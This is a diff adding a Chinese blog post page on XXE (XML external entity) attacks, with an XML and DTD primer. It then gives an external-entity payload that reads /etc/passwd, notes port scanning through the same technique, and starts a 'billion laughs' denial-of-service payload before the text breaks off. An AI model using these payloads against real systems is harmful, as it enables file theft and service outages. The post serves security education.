@@ -1,0 +1,1301 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="v_OkIhl-1XjKYm3MZSJoivLgfqE3N9Snb2bj2c9YDrw" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="web security,xxe" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="XML 简介XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：  HTML 被设计用来显示数据 XML 被设计用来传输和存储数据  XML作用 数据分离  如果你需要在HTML文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑HTML。通过XML，数据能够存储">
+<meta name="keywords" content="web security,xxe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE利用与防御">
+<meta property="og:url" content="http://yoursite.com/blog/xxe/index.html">
+<meta property="og:site_name" content="empty_xl Blog">
+<meta property="og:description" content="XML 简介XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：  HTML 被设计用来显示数据 XML 被设计用来传输和存储数据  XML作用 数据分离  如果你需要在HTML文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑HTML。通过XML，数据能够存储">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/blog/xxe/external-entity.png">
+<meta property="og:updated_time" content="2018-02-04T15:10:35.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XXE利用与防御">
+<meta name="twitter:description" content="XML 简介XML 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：  HTML 被设计用来显示数据 XML 被设计用来传输和存储数据  XML作用 数据分离  如果你需要在HTML文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑HTML。通过XML，数据能够存储">
+<meta name="twitter:image" content="http://yoursite.com/blog/xxe/external-entity.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QT63IJTEZX',
+      apiKey: '39726b4e0e80a502f3d0a45f494af02f',
+      indexName: 'emptyxl.github.io',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/blog/xxe/"/>
+
+
+
+
+
+  <title>XXE利用与防御 | empty_xl Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-90390918-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?edc3c09a0382806fc3a47d6c11483da0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">empty_xl Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Hello World！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/blog/xxe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="empty_xl">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="empty_xl Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE利用与防御</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-15T20:38:17+08:00">
+                2017-12-15
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-02-04T23:10:35+08:00">
+                2018-02-04
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="XML-简介"><a href="#XML-简介" class="headerlink" title="XML 简介"></a>XML 简介</h3><p><code>XML</code> 即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是<code>W3C</code>的推荐标准。其于<code>HTML</code>的区别是：</p>
+<ul>
+<li><code>HTML</code> 被设计用来显示数据</li>
+<li><code>XML</code> 被设计用来传输和存储数据</li>
+</ul>
+<h4 id="XML作用"><a href="#XML作用" class="headerlink" title="XML作用"></a>XML作用</h4><blockquote>
+<p>数据分离</p>
+</blockquote>
+<p>如果你需要在<code>HTML</code>文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑<code>HTML</code>。<br>通过<code>XML</code>，数据能够存储在独立的<code>XML</code>文件中。这样你就可以专注于使用<code>HTML</code>进行布局和显示，并确保修改底层数据不再需要对<code>HTML</code>进行任何的改变。<br>通过使用几行<code>JavaScript</code>，你就可以读取一个外部<code>XML</code>文件，然后更新<code>HTML</code>中的数据内容。</p>
+<blockquote>
+<p>简化数据共享</p>
+</blockquote>
+<p>在真实的世界中，计算机系统和数据使用不兼容的格式来存储数据。<br><code>XML</code>数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。<br>这让创建不同应用程序可以共享的数据变得更加容易。</p>
+<a id="more"></a>
+<h4 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a><code>XML</code>结构</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"COOKING"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"CHILDREN"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">"WEB"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </div><div class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></div></pre></td></tr></table></figure>
+<h4 id="XML特性"><a href="#XML特性" class="headerlink" title="XML特性"></a><code>XML</code>特性</h4><ul>
+<li>所有 XML 元素都须有<strong>关闭标签</strong></li>
+<li>标签对大小写敏感</li>
+<li>必须正确地嵌套</li>
+<li>文档必须有根元素</li>
+<li><code>XML</code>的属性值须加引号</li>
+<li>实体引用，一些特殊字符(<code>&lt;&gt;&amp;&#39;&quot;</code>需要转义)</li>
+<li>注释使用<code>&lt;!--xxx--&gt;</code></li>
+<li>空格会被保留</li>
+<li>不同系统换行存储不一样(<code>win</code>下<code>\r\n</code>，<code>*inx</code>下<code>\n</code>)</li>
+<li>元数据（有关数据的数据）应当存储为属性，而数据本身应当存储为元素 </li>
+</ul>
+<p><code>XSLT</code> 是首选的<code>XML</code>样式表语言</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"> <span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"ISO-8859-1"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml-stylesheet type=<span class="string">"text/xsl"</span> href=<span class="string">"simple.xsl"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">breakfast_menu</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">food</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Belgian Waffles<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>$5.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span></div><div class="line">       two of our famous Belgian Waffles</div><div class="line">    <span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">calories</span>&gt;</span>650<span class="tag">&lt;/<span class="name">calories</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">food</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">breakfast_menu</span>&gt;</span></div></pre></td></tr></table></figure>
+<h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h4><p><code>XMLHttpRequest</code>对象用于在后台与服务器交换数据，<code>XMLHttpRequest</code>:</p>
+<ul>
+<li>在不重新加载页面的情况下更新网页</li>
+<li>在页面已加载后从服务器请求数据</li>
+<li>在页面已加载后从服务器接收数据</li>
+<li>在后台向服务器发送数据</li>
+</ul>
+<h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（<code>DTD</code>）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
+<p><code>DTD</code> 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</div><div class="line">&lt;!DOCTYPE <span class="literal">note</span> [</div><div class="line">  &lt;!ELEMENT <span class="literal">note</span> (<span class="keyword">to</span>,from,heading,<span class="keyword">body</span>)&gt;</div><div class="line">  &lt;!ELEMENT <span class="keyword">to</span>      (#PCDATA)&gt;</div><div class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</div><div class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</div><div class="line">  &lt;!ELEMENT <span class="keyword">body</span>    (#PCDATA)&gt;</div><div class="line">]&gt;</div><div class="line">&lt;<span class="literal">note</span>&gt;</div><div class="line">  &lt;<span class="keyword">to</span>&gt;George&lt;/<span class="keyword">to</span>&gt;</div><div class="line">  &lt;from&gt;John&lt;/from&gt;</div><div class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</div><div class="line">  &lt;<span class="keyword">body</span>&gt;Don<span class="symbol">'t</span> forget the meeting!&lt;/<span class="keyword">body</span>&gt;</div><div class="line">&lt;/<span class="literal">note</span>&gt;</div><div class="line"></div><div class="line"><span class="comment">-----</span></div><div class="line"></div><div class="line">!DOCTYPE <span class="literal">note</span> (第二行)定义此文档是 <span class="literal">note</span> 类型的文档。</div><div class="line">!ELEMENT <span class="literal">note</span> (第三行)定义 <span class="literal">note</span> 元素有四个元素：<span class="string">"to、from、heading,、body"</span></div><div class="line">!ELEMENT <span class="keyword">to</span> (第四行)定义 <span class="keyword">to</span> 元素为 <span class="string">"#PCDATA"</span> 类型</div><div class="line">!ELEMENT from (第五行)定义 from 元素为 <span class="string">"#PCDATA"</span> 类型</div><div class="line">!ELEMENT heading (第六行)定义 heading 元素为 <span class="string">"#PCDATA"</span> 类型</div><div class="line">!ELEMENT <span class="keyword">body</span> (第七行)定义 <span class="keyword">body</span> 元素为 <span class="string">"#PCDATA"</span> 类型</div><div class="line"></div><div class="line">&lt;!ELEMENT <span class="literal">note</span> (<span class="keyword">to</span>+,from*,heading?,<span class="keyword">body</span>)&gt;</div><div class="line">+ 表示 此元素至少出现一次</div><div class="line">* 表示 此元素出现<span class="number">0</span>次或多次</div><div class="line">? 表示 此元素出现<span class="number">0</span>次或<span class="number">1</span>次</div></pre></td></tr></table></figure>
+<p><code>PCDATA</code>(parsed character data)是会被解析器解析的文本。这些文本将被解析器检查实体以及标记</p>
+<p><code>CDATA</code>(character data)是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
+<p><code>DTD</code>实体</p>
+<blockquote>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br>实体引用是对实体的引用。<br>实体可在内部或外部进行声明。</p>
+</blockquote>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="section">内部实体：</span></div><div class="line">-----</div><div class="line">&lt;!ENTITY 实体名称 "实体的值"&gt;</div><div class="line"></div><div class="line">例子：</div><div class="line">&lt;!ENTITY writer "Bill Gates"&gt;</div><div class="line">&lt;!ENTITY copyright "Copyright W3School.com.cn"&gt;</div><div class="line"></div><div class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</div><div class="line"></div><div class="line"><span class="section">外部实体：</span></div><div class="line">-----</div><div class="line">&lt;!ENTITY 实体名称 SYSTEM "URI/URL"&gt;</div><div class="line"></div><div class="line">&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;</div><div class="line">&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;</div><div class="line"></div><div class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</div><div class="line"></div><div class="line"></div><div class="line"><span class="section">参数实体：</span></div><div class="line">-----</div><div class="line">&lt;!ENTITY % 实体名称 "实体的值"&gt;</div><div class="line">或者</div><div class="line">&lt;!ENTITY % 实体名称 SYSTEM "URI"&gt;</div><div class="line"></div><div class="line">%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</div><div class="line"></div><div class="line"><span class="section">公共实体：</span></div><div class="line">-----</div><div class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI"&gt;</div><div class="line"></div><div class="line">例子:</div><div class="line">&lt;?xml version="1.0″?&gt;   </div><div class="line">&lt;!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN"</div><div class="line">“http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;</div></pre></td></tr></table></figure>
+<h3 id="XXE-Attack"><a href="#XXE-Attack" class="headerlink" title="XXE Attack"></a>XXE Attack</h3><p>“XML External Entity attack” 即<code>XXE</code> XML外部实体攻击，举一个简单的例子：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">&lt;!ENTITY xee SYSTEM "file:///etc/passwd"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></div><div class="line">    &amp;xee;</div><div class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>可以看到，我们的外部实体引用指向了系统<code>passwd</code>文件，在解析xml时会将敏感信息返回。</p>
+<h4 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h4><h5 id="XXE读文件"><a href="#XXE读文件" class="headerlink" title="XXE读文件"></a>XXE读文件</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">&lt;!ENTITY xee SYSTEM "file:///etc/passwd"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></div><div class="line">    &amp;xee;</div><div class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>在外部实体引用是，不同的程序所支持URI协议是不一样的:</p>
+<img src="/blog/xxe/external-entity.png" alt="external-entity" title="external-entity">  
+<p>和读文件一样，也可进行内网端口扫描，访问不同端口，观察返回信息或者banner内容进行鉴别。</p>
+<h5 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h5><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="params">&lt;?xml version="<span class="number">1.0</span>"?&gt;</span></div><div class="line"><span class="params">&lt;!DOCTYPE lolz [</span></div><div class="line"> &lt;!ENTITY lol "lol"&gt;</div><div class="line"> <span class="params">&lt;!ELEMENT lolz (#PCDATA)&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol1 "<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;<span class="variable">&amp;lol</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol2 "<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;<span class="variable">&amp;lol1</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol3 "<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;<span class="variable">&amp;lol2</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol4 "<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;<span class="variable">&amp;lol3</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol5 "<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;<span class="variable">&amp;lol4</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol6 "<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;<span class="variable">&amp;lol5</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol7 "<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;<span class="variable">&amp;lol6</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol8 "<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;<span class="variable">&amp;lol7</span>;"&gt;</span></div><div class="line"> <span class="params">&lt;!ENTITY lol9 "<span class="variable">&amp;lol8</span>;<span class="variable">&amp;lol8</span>;<span 